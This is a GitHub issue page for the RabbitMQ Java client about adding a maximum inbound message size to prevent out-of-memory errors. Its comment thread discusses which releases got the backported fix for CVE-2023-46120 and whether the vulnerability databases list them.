[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)

`[Add max inbound message size to ConnectionFactory](/rabbitmq/rabbitmq-java-client/commit/9ed45fde52224ec74fc523321efdf9a157d5cfca "Add max inbound message size to ConnectionFactory

To avoid OOM with a very large message.
The default value is 64 MiB.

Fixes #1062")`
…

`[9ed45fd](/rabbitmq/rabbitmq-java-client/commit/9ed45fde52224ec74fc523321efdf9a157d5cfca)`

```
To avoid OOM with a very large message.
The default value is 64 MiB.

Fixes [#1062](https://github.com/rabbitmq/rabbitmq-java-client/issues/1062)
```

[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)
[acogoluegnes](/acogoluegnes)
mentioned this issue
[Jun 15, 2023](#ref-pullrequest-1758292378)

[Add max inbound message size to ConnectionFactory
#1063](/rabbitmq/rabbitmq-java-client/pull/1063)
 Merged

[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)
[acogoluegnes](/acogoluegnes)
added
the
[breaking-change](/rabbitmq/rabbitmq-java-client/labels/breaking-change)
label
[Jun 15, 2023](#event-9537208628)

[acogoluegnes](/acogoluegnes)
added a commit
that referenced
this issue
[Jun 15, 2023](#ref-commit-5982cd1)
[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)

`[Tweak error message](/rabbitmq/rabbitmq-java-client/commit/5982cd1eb307004fe53353a01da03332aa342eb2 "Tweak error message

References #1062")`
…

`[5982cd1](/rabbitmq/rabbitmq-java-client/commit/5982cd1eb307004fe53353a01da03332aa342eb2)`

```
References [#1062](https://github.com/rabbitmq/rabbitmq-java-client/issues/1062)
```

[![@michaelklishin](https://avatars.githubusercontent.com/u/1090?s=40&u=5a39ce34a2163cf39d7524da94554db91cbcda50&v=4)](/michaelklishin)
[michaelklishin](/michaelklishin)
closed this as [completed](/rabbitmq/rabbitmq-java-client/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
in
[#1063](/rabbitmq/rabbitmq-java-client/pull/1063)
[Jun 15, 2023](#event-9541346211)

[acogoluegnes](/acogoluegnes)
added a commit
that referenced
this issue
[Jun 15, 2023](#ref-commit-714aae6)
[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)

`[Add max inbound message size to ConnectionFactory](/rabbitmq/rabbitmq-java-client/commit/714aae602dcae6cb4b53cadf009323ebac313cc8 "Add max inbound message size to ConnectionFactory

To avoid OOM with a very large message.
The default value is 64 MiB.

Fixes #1062

(cherry picked from commit 9ed45fde52224ec74fc523321efdf9a157d5cfca)")`
…

`[714aae6](/rabbitmq/rabbitmq-java-client/commit/714aae602dcae6cb4b53cadf009323ebac313cc8)`

```
To avoid OOM with a very large message.
The default value is 64 MiB.

Fixes [#1062](https://github.com/rabbitmq/rabbitmq-java-client/issues/1062)

(cherry picked from commit [9ed45fd](https://github.com/rabbitmq/rabbitmq-java-client/commit/9ed45fde52224ec74fc523321efdf9a157d5cfca))
```

[acogoluegnes](/acogoluegnes)
added a commit
that referenced
this issue
[Jun 15, 2023](#ref-commit-04f1801)
[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)

`[Tweak error message](/rabbitmq/rabbitmq-java-client/commit/04f1801ae6eaac10af7bf802c8fb7065284624e6 "Tweak error message

References #1062

(cherry picked from commit 5982cd1eb307004fe53353a01da03332aa342eb2)")`
…

`[04f1801](/rabbitmq/rabbitmq-java-client/commit/04f1801ae6eaac10af7bf802c8fb7065284624e6)`

```
References [#1062](https://github.com/rabbitmq/rabbitmq-java-client/issues/1062)

(cherry picked from commit [5982cd1](https://github.com/rabbitmq/rabbitmq-java-client/commit/5982cd1eb307004fe53353a01da03332aa342eb2))
```

[acogoluegnes](/acogoluegnes)
added a commit
that referenced
this issue
[Jun 29, 2023](#ref-commit-a30f554)
[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)

`[Add max inbound message size to ConnectionFactory](/rabbitmq/rabbitmq-java-client/commit/a30f554acaece1d9470df7a5b98259da138bc4c5 "Add max inbound message size to ConnectionFactory

To avoid OOM with a very large message.
The default value is 64 MiB.

Fixes #1062

(cherry picked from commit 9ed45fde52224ec74fc523321efdf9a157d5cfca)

Conflicts:
	src/main/java/com/rabbitmq/client/impl/Frame.java
	src/test/java/com/rabbitmq/client/test/TestUtils.java")`
…

`[a30f554](/rabbitmq/rabbitmq-java-client/commit/a30f554acaece1d9470df7a5b98259da138bc4c5)`

```
To avoid OOM with a very large message.
The default value is 64 MiB.

Fixes [#1062](https://github.com/rabbitmq/rabbitmq-java-client/issues/1062)

(cherry picked from commit [9ed45fd](https://github.com/rabbitmq/rabbitmq-java-client/commit/9ed45fde52224ec74fc523321efdf9a157d5cfca))

Conflicts:
	src/main/java/com/rabbitmq/client/impl/Frame.java
	src/test/java/com/rabbitmq/client/test/TestUtils.java
```

[acogoluegnes](/acogoluegnes)
added a commit
that referenced
this issue
[Jun 29, 2023](#ref-commit-bb85c68)
[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)

`[Tweak error message](/rabbitmq/rabbitmq-java-client/commit/bb85c686a6b47b7fe12219acc1f075d8ae7b072b "Tweak error message

References #1062

(cherry picked from commit 5982cd1eb307004fe53353a01da03332aa342eb2)")`
…

`[bb85c68](/rabbitmq/rabbitmq-java-client/commit/bb85c686a6b47b7fe12219acc1f075d8ae7b072b)`

```
References [#1062](https://github.com/rabbitmq/rabbitmq-java-client/issues/1062)

(cherry picked from commit [5982cd1](https://github.com/rabbitmq/rabbitmq-java-client/commit/5982cd1eb307004fe53353a01da03332aa342eb2))
```

[acogoluegnes](/acogoluegnes)
added a commit
that referenced
this issue
[Jun 29, 2023](#ref-commit-97590ab)
[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)

`[Add max inbound message size to ConnectionFactory](/rabbitmq/rabbitmq-java-client/commit/97590abf06a684c172b847a356b3d77969fcdaea "Add max inbound message size to ConnectionFactory

To avoid OOM with a very large message.
The default value is 64 MiB.

Fixes #1062

(cherry picked from commit 9ed45fde52224ec74fc523321efdf9a157d5cfca)

Conflicts:
	src/main/java/com/rabbitmq/client/impl/Frame.java
	src/test/java/com/rabbitmq/client/test/TestUtils.java")`
…

`[97590ab](/rabbitmq/rabbitmq-java-client/commit/97590abf06a684c172b847a356b3d77969fcdaea)`

```
To avoid OOM with a very large message.
The default value is 64 MiB.

Fixes [#1062](https://github.com/rabbitmq/rabbitmq-java-client/issues/1062)

(cherry picked from commit [9ed45fd](https://github.com/rabbitmq/rabbitmq-java-client/commit/9ed45fde52224ec74fc523321efdf9a157d5cfca))

Conflicts:
	src/main/java/com/rabbitmq/client/impl/Frame.java
	src/test/java/com/rabbitmq/client/test/TestUtils.java
```

[acogoluegnes](/acogoluegnes)
added a commit
that referenced
this issue
[Jun 29, 2023](#ref-commit-05f0fd6)
[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)

`[Tweak error message](/rabbitmq/rabbitmq-java-client/commit/05f0fd6700747611a5a0fb6b04fd1b6542842b82 "Tweak error message

References #1062

(cherry picked from commit 5982cd1eb307004fe53353a01da03332aa342eb2)")`
…

`[05f0fd6](/rabbitmq/rabbitmq-java-client/commit/05f0fd6700747611a5a0fb6b04fd1b6542842b82)`

```
References [#1062](https://github.com/rabbitmq/rabbitmq-java-client/issues/1062)

(cherry picked from commit [5982cd1](https://github.com/rabbitmq/rabbitmq-java-client/commit/5982cd1eb307004fe53353a01da03332aa342eb2))
```

[acogoluegnes](/acogoluegnes)
added a commit
that referenced
this issue
[Jun 29, 2023](#ref-commit-d0b0f2b)
[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)

`[Add max inbound message size to ConnectionFactory](/rabbitmq/rabbitmq-java-client/commit/d0b0f2b23087eb22a4d5d321357b80658866aa20 "Add max inbound message size to ConnectionFactory

To avoid OOM with a very large message.
The default value is 64 MiB.

Fixes #1062

(cherry picked from commit 9ed45fde52224ec74fc523321efdf9a157d5cfca)")`
…

`[d0b0f2b](/rabbitmq/rabbitmq-java-client/commit/d0b0f2b23087eb22a4d5d321357b80658866aa20)`

```
To avoid OOM with a very large message.
The default value is 64 MiB.

Fixes [#1062](https://github.com/rabbitmq/rabbitmq-java-client/issues/1062)

(cherry picked from commit [9ed45fd](https://github.com/rabbitmq/rabbitmq-java-client/commit/9ed45fde52224ec74fc523321efdf9a157d5cfca))
```

[acogoluegnes](/acogoluegnes)
added a commit
that referenced
this issue
[Jun 29, 2023](#ref-commit-877c679)
[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)

`[Tweak error message](/rabbitmq/rabbitmq-java-client/commit/877c67955875aa90aab35bc028d0ecdec5554ca3 "Tweak error message

References #1062

(cherry picked from commit 5982cd1eb307004fe53353a01da03332aa342eb2)")`
…

`[877c679](/rabbitmq/rabbitmq-java-client/commit/877c67955875aa90aab35bc028d0ecdec5554ca3)`

```
References [#1062](https://github.com/rabbitmq/rabbitmq-java-client/issues/1062)

(cherry picked from commit [5982cd1](https://github.com/rabbitmq/rabbitmq-java-client/commit/5982cd1eb307004fe53353a01da03332aa342eb2))
```

[![@gdimitrov7](https://avatars.githubusercontent.com/u/26636125?s=80&u=9aecdd42128f0b234227f4288b3a3f41dce180c6&v=4)](/gdimitrov7)

Copy link

### **[gdimitrov7](/gdimitrov7)** commented [Nov 10, 2023](#issuecomment-1805478189)

| The [releases list](https://github.com/rabbitmq/rabbitmq-java-client/releases) and the commit history both show that the fix was backported to: [v5.17.1](https://github.com/rabbitmq/rabbitmq-java-client/releases/tag/v5.17.1) [v5.16.1](https://github.com/rabbitmq/rabbitmq-java-client/releases/tag/v5.16.1) [v5.14.3](https://github.com/rabbitmq/rabbitmq-java-client/releases/tag/v5.14.3)  [@acogoluegnes](https://github.com/acogoluegnes) Can you confirm?  I want confirmation because   * <https://nvd.nist.gov/vuln/detail/CVE-2023-46120#vulnConfigurationsArea> * [GHSA-mm8h-8587-p46h](https://github.com/rabbitmq/rabbitmq-java-client/security/advisories/GHSA-mm8h-8587-p46h "GHSA-mm8h-8587-p46h")   show that the fix is only available in 5.18.0+ which is only one branch.  [@michaelklishin](https://github.com/michaelklishin) Is it possible to update the security advisories with correct versions? Thank you. |
| --- |

All reactions

Sorry, something went wrong.

[![@michaelklishin](https://avatars.githubusercontent.com/u/1090?s=80&u=5a39ce34a2163cf39d7524da94554db91cbcda50&v=4)](/michaelklishin)

Copy link

Member

### **[michaelklishin](/michaelklishin)** commented [Nov 10, 2023](#issuecomment-1805627355) • edited Loading

| [@gdimitrov7](https://github.com/gdimitrov7) you can inspect the branches of those releases just like we can, [here is `5.17.x-stable`](https://github.com/rabbitmq/rabbitmq-java-client/commits/5.17.x-stable), for instance.  A GitHub security advisory only has one "affected versions" field IIRC. There are no reasons to to prefer 5.17 over the latest 5.x, this client ships minors often and usually without breaking changes of any kind. |
| --- |

All reactions

Sorry, something went wrong.

[![@michaelklishin](https://avatars.githubusercontent.com/u/1090?s=80&u=5a39ce34a2163cf39d7524da94554db91cbcda50&v=4)](/michaelklishin)

Copy link

Member

### **[michaelklishin](/michaelklishin)** commented [Nov 10, 2023](#issuecomment-1805629746)

| [@gdimitrov7](https://github.com/gdimitrov7) we cannot retroactively update NIST database entries, therefore we won't update the advisory even if there was/is a way to list multiple affected versions. |
| --- |

All reactions

Sorry, something went wrong.

[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=80&u=9f4a73a0b9921a3fd05acca8701d27af4d848052&v=4)](/acogoluegnes)

Copy link

Contributor

Author

### **[acogoluegnes](/acogoluegnes)** commented [Nov 10, 2023](#issuecomment-1805860634)

| [@gdimitrov7](https://github.com/gdimitrov7) Yes, it's been backported to those patch releases. You should use 5.20.0 (the latest as of today) though, it's backward compatible. |
| --- |

All reactions

Sorry, something went wrong.

[![@peterwvz](https://avatars.githubusercontent.com/u/94926992?s=80&v=4)](/peterwvz)

Copy link

### **[peterwvz](/peterwvz)** commented [Feb 19, 2024](#issuecomment-1953179403) • edited Loading

| we cannot retroactively update NIST database entries, therefore we won't update the advisory even if there was/is a way to list multiple affected versions.  [@michaelklishin](https://github.com/michaelklishin) You can actually update NVD. Happens all the time. Reanalysis efforts are typically driven by external engagement such as emails to nvd@nist.gov or cpe\_dictionary@nist.gov. You'd include the pertinent info (like this thread) showing the backports happened. I think that's the only way to get all the enterprise vulnerability scanners to acknowledge that 5.18.0 is not the only fix for this CVE. |
| --- |

All reactions

Sorry, something went wrong.

[![@michaelklishin](https://avatars.githubusercontent.com/u/1090?s=80&u=5a39ce34a2163cf39d7524da94554db91cbcda50&v=4)](/michaelklishin)

Copy link

Member

### **[michaelklishin](/michaelklishin)** commented [Feb 19, 2024](#issuecomment-1953192248)

| There are also no reasons for the 5.17 users not to upgrade to 5.18 or 5.20. As stated earlier, this client usually ships minor releases without any breaking changes.  Our small team has more important things to worry about than making sure a three minor behind patch release of this client has a backport accounted for in the NIST database.  We have fixed the issue and released a round of back ports. NIST is notified. If someone has the cycle to update the NIST database, they can do it by providing evidence from this public repository. |
| --- |

All reactions

Sorry, something went wrong.

[![@peterwvz](https://avatars.githubusercontent.com/u/94926992?s=80&v=4)](/peterwvz)

Copy link

### **[peterwvz](/peterwvz)** commented [Feb 19, 2024](#issuecomment-1953198441) via email • edited Loading

| Understood. I am working with a third party vendor. They are on 5.14.3 and getting caught by an enterprise vuln. scanner flagging that versions as vulnerable - saying that they need to upgrade to 5.18.0.  this client usually ships minor releases without any breaking changes. It's the "usually" in that sentence that is the problem. The vendor has other critical CVEs that need addressing. And upgrading any component involves rerunning all the regressions tests/acceptance test, etc. etc. Work they'd prefer to avoid and they know they can avoid since they actually do have the backported fix!! The only thing that doesn't understand that is the enterprise vuln. scanners.... |
| --- |

All reactions

Sorry, something went wrong.

[![@michaelklishin](https://avatars.githubusercontent.com/u/1090?s=80&u=5a39ce34a2163cf39d7524da94554db91cbcda50&v=4)](/michaelklishin)

Copy link

Member

### **[michaelklishin](/michaelklishin)** commented [Feb 20, 2024](#issuecomment-1953309828) • edited Loading

| [@peterwvz](https://github.com/peterwvz) we have done our job: we have responded to a responsibly disclosed vulnerability, patched it, backported it N times and produced a round of releases, then disclosed it when we were able to do so according to VMware vulnerability disclosure requirements.  That problem you have with a vendor on 5.14? Sorry, that's not our job. We are not paid by that vendor. In fact, that vendor might as well use open source RabbitMQ without a support contact and thus might get everything, including updates, for free, year after year.  And now we have to worry about their upgrade routine and security vulnerability scanner? Wow, the standards are high for OSS maintainers these days. |
| --- |

All reactions

Sorry, something went wrong.

[![@rabbitmq](https://avatars.githubusercontent.com/u/96669?s=40&v=4)](/rabbitmq)
[rabbitmq](/rabbitmq)
locked as **resolved** and limited conversation to collaborators
[Feb 20, 2024](#event-11855305914)

[Sign up for free](/join?source=comment-repo)
**to subscribe to this conversation on GitHub**.
Already have an account?
[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frabbitmq%2Frabbitmq-java-client%2Fissues%2F1062).

Assignees

[![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=40&v=4)](/acogoluegnes) [acogoluegnes](/acogoluegnes)

Labels

[breaking-change](/rabbitmq/rabbitmq-java-client/labels/breaking-change)
[usability](/rabbitmq/rabbitmq-java-client/labels/usability)

Projects

None yet

Milestone

 [**5.18.0**](/rabbitmq/rabbitmq-java-client/milestone/85 "5.18.0")

Development

Successfully merging a pull request may close this issue.

 [Add max inbound message size to ConnectionFactory](/rabbitmq/rabbitmq-java-client/pull/1063)
 [rabbitmq/rabbitmq-java-client](/rabbitmq/rabbitmq-java-client)

4 participants

[![@michaelklishin](https://avatars.githubusercontent.com/u/1090?s=52&v=4)](/michaelklishin) [![@acogoluegnes](https://avatars.githubusercontent.com/u/514737?s=52&v=4)](/acogoluegnes) [![@gdimitrov7](https://avatars.githubusercontent.com/u/26636125?s=52&v=4)](/gdimitrov7) [![@peterwvz](https://avatars.githubusercontent.com/u/94926992?s=52&v=4)](/peterwvz)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


